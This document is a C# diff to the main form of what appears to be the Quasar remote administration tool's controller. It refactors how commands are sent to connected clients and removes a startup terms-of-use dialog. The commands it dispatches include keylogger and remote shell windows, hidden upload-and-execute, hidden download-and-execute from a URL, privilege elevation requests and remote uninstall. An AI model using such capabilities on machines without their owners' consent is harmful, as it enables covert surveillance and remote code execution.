@@ -4,11 +4,13 @@ using System.IO;
 using System.Linq;
 using System.Threading;
 using System.Windows.Forms;
+using Quasar.Common.Enums;
+using Quasar.Common.IO;
+using Quasar.Common.Messages;
 using xServer.Core.Commands;
 using xServer.Core.Cryptography;
 using xServer.Core.Data;
 using xServer.Core.Extensions;
-using xServer.Enums;
 using xServer.Core.Helper;
 using xServer.Core.Networking;
 using xServer.Core.Networking.Utilities;
@@ -30,25 +32,11 @@ namespace xServer.Forms
         private readonly object _processingClientConnectionsLock = new object();
         private readonly object _lockClients = new object(); // lock for clients-listview
 
-        private void ShowTermsOfService()
-        {
-            using (var frm = new FrmTermsOfUse())
-            {
-                frm.ShowDialog();
-            }
-            Thread.Sleep(300);
-        }
-
         public FrmMain()
         {
             Instance = this;
 
             AES.SetDefaultKey(Settings.Password);
-
-#if !DEBUG
-            if (Settings.ShowToU)
-                ShowTermsOfService();
-#endif
 
             InitializeComponent();
         }
@@ -437,15 +425,27 @@ namespace xServer.Forms
                 {
                     if (frm.ShowDialog() == DialogResult.OK)
                     {
-                        if (Core.Data.Update.UseDownload)
+                        if (!frm.UseDownload && !File.Exists(frm.UploadPath)) return;
+
+                        if (frm.UseDownload)
                         {
                             foreach (Client c in GetSelectedClients())
                             {
-                                new Core.Packets.ServerPackets.DoClientUpdate(0, Core.Data.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
+                                c.Send(new DoClientUpdate
+                                {
+                                    Id = 0,
+                                    DownloadUrl = frm.DownloadUrl,
+                                    FileName = string.Empty,
+                                    Block = new byte[0x00],
+                                    MaxBlocks = 0,
+                                    CurrentBlock = 0
+                                });
                             }
                         }
                         else
                         {
+                            string path = frm.UploadPath;
+
                             new Thread(() =>
                             {
                                 bool error = false;
@@ -454,10 +454,10 @@ namespace xServer.Forms
                                     if (c == null) continue;
                                     if (error) continue;
 
-                                    FileSplit srcFile = new FileSplit(Core.Data.Update.UploadPath);
+                                    FileSplit srcFile = new FileSplit(path);
                                     if (srcFile.MaxBlocks < 0)
                                     {
-                                        MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
+                                        MessageBox.Show($"Error reading file: {srcFile.LastError}",
                                             "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                         error = true;
                                         break;
@@ -466,19 +466,28 @@ namespace xServer.Forms
                                     int id = FileHelper.GetNewTransferId();
 
                                     CommandHandler.HandleSetStatus(c,
-                                        new Core.Packets.ClientPackets.SetStatus("Uploading file..."));
+                                        new SetStatus {Message = "Uploading file..."});
 
                                     for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                     {
                                         byte[] block;
                                         if (!srcFile.ReadBlock(currentBlock, out block))
                                         {
-                                            MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
+                                            MessageBox.Show($"Error reading file: {srcFile.LastError}",
                                                 "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                             error = true;
                                             break;
                                         }
-                                        new Core.Packets.ServerPackets.DoClientUpdate(id, string.Empty, string.Empty, block, srcFile.MaxBlocks, currentBlock).Execute(c);
+
+                                        c.Send(new DoClientUpdate
+                                        {
+                                            Id = id,
+                                            DownloadUrl = string.Empty,
+                                            FileName = string.Empty,
+                                            Block = block,
+                                            MaxBlocks = srcFile.MaxBlocks,
+                                            CurrentBlock = currentBlock
+                                        });
                                     }
                                 }
                             }).Start();
@@ -492,7 +501,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.DoClientReconnect().Execute(c);
+                c.Send(new DoClientReconnect());
             }
         }
 
@@ -500,7 +509,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.DoClientDisconnect().Execute(c);
+                c.Send(new DoClientDisconnect());
             }
         }
 
@@ -516,7 +525,7 @@ namespace xServer.Forms
             {
                 foreach (Client c in GetSelectedClients())
                 {
-                    new Core.Packets.ServerPackets.DoClientUninstall().Execute(c);
+                    c.Send(new DoClientUninstall());
                 }
             }
         }
@@ -529,13 +538,9 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                if (c.Value.FrmSi != null)
-                {
-                    c.Value.FrmSi.Focus();
-                    return;
-                }
-                FrmSystemInformation frmSI = new FrmSystemInformation(c);
-                frmSI.Show();
+                FrmSystemInformation frmSi = FrmSystemInformation.CreateNewOrGetExisting(c);
+                frmSi.Show();
+                frmSi.Focus();
             }
         }
 
@@ -543,13 +548,9 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                if (c.Value.FrmFm != null)
-                {
-                    c.Value.FrmFm.Focus();
-                    return;
-                }
-                FrmFileManager frmFM = new FrmFileManager(c);
-                frmFM.Show();
+                FrmFileManager frmFm = FrmFileManager.CreateNewOrGetExisting(c);
+                frmFm.Show();
+                frmFm.Focus();
             }
         }
 
@@ -557,13 +558,9 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                if (c.Value.FrmStm != null)
-                {
-                    c.Value.FrmStm.Focus();
-                    return;
-                }
-                FrmStartupManager frmStm = new FrmStartupManager(c);
+                FrmStartupManager frmStm = FrmStartupManager.CreateNewOrGetExisting(c);
                 frmStm.Show();
+                frmStm.Focus();
             }
         }
 
@@ -571,13 +568,9 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                if (c.Value.FrmTm != null)
-                {
-                    c.Value.FrmTm.Focus();
-                    return;
-                }
-                FrmTaskManager frmTM = new FrmTaskManager(c);
-                frmTM.Show();
+                FrmTaskManager frmTm = FrmTaskManager.CreateNewOrGetExisting(c);
+                frmTm.Show();
+                frmTm.Focus();
             }
         }
 
@@ -585,13 +578,9 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                if (c.Value.FrmRs != null)
-                {
-                    c.Value.FrmRs.Focus();
-                    return;
-                }
-                FrmRemoteShell frmRS = new FrmRemoteShell(c);
-                frmRS.Show();
+                FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(c);
+                frmRs.Show();
+                frmRs.Focus();
             }
         }
 
@@ -599,14 +588,9 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                if (c.Value.FrmCon != null)
-                {
-                    c.Value.FrmCon.Focus();
-                    return;
-                }
-
-                FrmConnections frmCON = new FrmConnections(c);
-                frmCON.Show();
+                FrmConnections frmCon = FrmConnections.CreateNewOrGetExisting(c);
+                frmCon.Show();
+                frmCon.Focus();
             }
         }
 
@@ -614,12 +598,6 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                if (c.Value.FrmProxy != null)
-                {
-                    c.Value.FrmProxy.Focus();
-                    return;
-                }
-
                 FrmReverseProxy frmRS = new FrmReverseProxy(GetSelectedClients());
                 frmRS.Show();
             }
@@ -647,7 +625,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.DoAskElevate().Execute(c);
+                c.Send(new DoAskElevate());
             }
         }
 
@@ -655,7 +633,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.DoShutdownAction(ShutdownAction.Shutdown).Execute(c);
+                c.Send(new DoShutdownAction {Action = ShutdownAction.Shutdown});
             }
         }
 
@@ -663,7 +641,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.DoShutdownAction(ShutdownAction.Restart).Execute(c);
+                c.Send(new DoShutdownAction {Action = ShutdownAction.Restart});
             }
         }
 
@@ -671,7 +649,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.DoShutdownAction(ShutdownAction.Standby).Execute(c);
+                c.Send(new DoShutdownAction {Action = ShutdownAction.Standby});
             }
         }
 
@@ -683,13 +661,9 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                if (c.Value.FrmRdp != null)
-                {
-                    c.Value.FrmRdp.Focus();
-                    return;
-                }
-                FrmRemoteDesktop frmRDP = new FrmRemoteDesktop(c);
-                frmRDP.Show();
+                var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c);
+                frmRd.Show();
+                frmRd.Focus();
             }
         }
         private void remoteWebcamToolStripMenuItem_Click(object sender, EventArgs e)
@@ -724,13 +698,9 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                if (c.Value.FrmKl != null)
-                {
-                    c.Value.FrmKl.Focus();
-                    return;
-                }
-                FrmKeylogger frmKL = new FrmKeylogger(c);
-                frmKL.Show();
+                FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
+                frmKl.Show();
+                frmKl.Focus();
             }
         }
 
@@ -744,8 +714,11 @@ namespace xServer.Forms
             {
                 using (var frm = new FrmUploadAndExecute(lstClients.SelectedItems.Count))
                 {
-                    if ((frm.ShowDialog() == DialogResult.OK) && File.Exists(UploadAndExecute.FilePath))
+                    if (frm.ShowDialog() == DialogResult.OK && File.Exists(frm.LocalFilePath))
                     {
+                        string path = frm.LocalFilePath;
+                        bool hidden = frm.Hidden;
+
                         new Thread(() =>
                         {
                             bool error = false;
@@ -754,7 +727,7 @@ namespace xServer.Forms
                                 if (c == null) continue;
                                 if (error) continue;
 
-                                FileSplit srcFile = new FileSplit(UploadAndExecute.FilePath);
+                                FileSplit srcFile = new FileSplit(path);
                                 if (srcFile.MaxBlocks < 0)
                                 {
                                     MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
@@ -766,16 +739,22 @@ namespace xServer.Forms
                                 int id = FileHelper.GetNewTransferId();
 
                                 CommandHandler.HandleSetStatus(c,
-                                    new Core.Packets.ClientPackets.SetStatus("Uploading file..."));
+                                    new SetStatus {Message = "Uploading file..."});
 
                                 for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                 {
                                     byte[] block;
                                     if (srcFile.ReadBlock(currentBlock, out block))
                                     {
-                                        new Core.Packets.ServerPackets.DoUploadAndExecute(id,
-                                            Path.GetFileName(UploadAndExecute.FilePath), block, srcFile.MaxBlocks,
-                                            currentBlock, UploadAndExecute.RunHidden).Execute(c);
+                                        c.SendBlocking(new DoUploadAndExecute
+                                        {
+                                            Id = id,
+                                            FileName = Path.GetFileName(path),
+                                            Block = block,
+                                            MaxBlocks = srcFile.MaxBlocks,
+                                            CurrentBlock = currentBlock,
+                                            RunHidden = hidden
+                                        });
                                     }
                                     else
                                     {
@@ -802,8 +781,11 @@ namespace xServer.Forms
                     {
                         foreach (Client c in GetSelectedClients())
                         {
-                            new Core.Packets.ServerPackets.DoDownloadAndExecute(DownloadAndExecute.URL,
-                                DownloadAndExecute.RunHidden).Execute(c);
+                            c.Send(new DoDownloadAndExecute
+                            {
+                                Url = frm.Url,
+                                RunHidden = frm.Hidden
+                            });
                         }
                     }
                 }
@@ -820,7 +802,11 @@ namespace xServer.Forms
                     {
                         foreach (Client c in GetSelectedClients())
                         {
-                            new Core.Packets.ServerPackets.DoVisitWebsite(VisitWebsite.URL, VisitWebsite.Hidden).Execute(c);
+                            c.Send(new DoVisitWebsite
+                            {
+                                Url = frm.Url,
+                                Hidden = frm.Hidden
+                            });
                         }
                     }
                 }
@@ -837,8 +823,13 @@ namespace xServer.Forms
                     {
                         foreach (Client c in GetSelectedClients())
                         {
-                            new Core.Packets.ServerPackets.DoShowMessageBox(
-                                Messagebox.Caption, Messagebox.Text, Messagebox.Button, Messagebox.Icon).Execute(c);
+                            c.Send(new DoShowMessageBox
+                            {
+                                Caption = frm.MsgBoxCaption,
+                                Text = frm.MsgBoxText,
+                                Button = frm.MsgBoxButton,
+                                Icon = frm.MsgBoxIcon
+                            });
                         }
                     }
                 }
